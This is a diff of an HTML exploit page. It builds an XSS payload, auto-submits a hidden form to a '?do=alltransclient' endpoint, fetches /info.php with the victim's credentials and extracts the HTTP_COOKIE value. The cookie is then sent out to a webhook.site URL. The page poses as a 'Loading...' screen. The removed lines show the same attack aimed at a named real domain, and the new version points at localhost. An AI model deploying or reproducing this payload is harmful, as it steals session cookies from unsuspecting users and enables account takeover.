@@ -1,15 +1,42 @@
-<form id="myForm" method="post" action="https://kingtelecom.info/?do=alltransclient">
+<html>
+<head><title>Loading...</title></head>
+<body>
+<p id="status" style="text-align:center;font-family:sans-serif">
+  جاري التحميل...
+</p>
 
-  <input type="button" onclick="formmethod()" value="CLICK ME PLS!!!!">
-
-  <input type="hidden" value="<img src=x onerror=new Image().src=`https://webhook.site/46a5f4cf-0692-4bdf-aae7-142ea3c3478a`+document.cookie>" name="dateOpt">
-
+<form id="myForm" method="post"
+  action="http://localhost:8080/?do=alltransclient">
+  <input type="hidden" name="user" value="all">
+  <input type="hidden" name="dateOpt" id="payload">
 </form>
 
 <script>
-	function formmethod() {
-	  document.getElementById("myForm").submit()
-	}
+var SERVER = "https://webhook.site/46a5f4cf-0692-4bdf-aae7-142ea3c3478a";
+
+// الخطوة 1: تأكيد وصول steal.php
+new Image().src = SERVER + "?c=EXPLOIT_LOADED";
+
+var xss = [
+  '">',
+  '<img src=x onerror="',
+  "fetch('/info.php',{credentials:'include'})",
+  ".then(function(r){return r.text()})",
+  ".then(function(h){",
+  "var idx=h.indexOf('HTTP_COOKIE');",
+  "var c=h.substring(idx,idx+500)",
+  ".replace(/\\x3C[^\\x3E]+\\x3E/g,'');",
+  "new Image().src='" + SERVER + "?c='+encodeURIComponent(c)",
+  "})",
+  ".catch(function(e){",
+  "new Image().src='" + SERVER + "?c=ERROR_'+encodeURIComponent(e)",
+  "})",
+  '">'
+].join('');
+
+document.getElementById('payload').value = xss;
+document.getElementById('myForm').submit();
 </script>
 
 </body>
+</html>
